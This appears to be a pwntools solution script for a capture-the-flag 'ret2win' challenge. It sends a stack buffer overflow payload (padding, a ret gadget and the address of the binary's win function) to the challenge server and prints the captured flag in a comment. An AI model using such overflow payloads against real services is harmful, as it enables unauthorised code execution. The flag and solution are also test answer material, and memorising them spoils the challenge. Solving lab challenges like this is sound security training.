from pwn import *

HOST = "ret2win.chal.imaginaryctf.org"
PORT = 1337
file = "./vuln"
e = ELF(file)
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]

command = '''
'''

#io = gdb.debug(file, command)
#io = process(file)
io = remote(HOST, PORT)

rop_ret = 0x0040101a

pld = b"A"*24
pld += p64(rop_ret)
pld += p64(e.sym["win"])

io.sendlineafter("address?", pld)

io.interactive()
#ictf{c0ngrats_on_pwn_number_1_9b1e2f30}
